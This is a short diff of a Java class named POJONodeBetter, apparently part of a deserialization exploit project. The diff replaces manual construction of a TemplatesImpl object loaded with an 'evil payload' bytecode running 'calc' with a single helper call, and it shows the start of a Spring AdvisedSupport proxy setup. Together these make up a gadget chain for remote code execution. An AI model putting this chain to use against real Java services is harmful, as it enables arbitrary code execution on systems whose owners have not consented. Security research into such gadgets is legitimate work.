@@ -22,12 +22,7 @@ import java.lang.reflect.Proxy;
  */
 public class POJONodeBetter {
     public static void main(String[] args) throws Exception {
-        byte[] bytes = Utils.getEvilPayload("calc");
-        TemplatesImpl templates = new TemplatesImpl();
-        Utils.setValue(templates , "_bytecodes", new byte[][]{bytes});
-        Utils.setValue(templates , "_name", "gadgets");
-        Utils.setValue(templates , "_tfactory", new TransformerFactoryImpl());
-
+        TemplatesImpl templates = Utils.createTemplatesImpl("calc");
 
         // 设置代理
         AdvisedSupport advisedSupport = new AdvisedSupport();
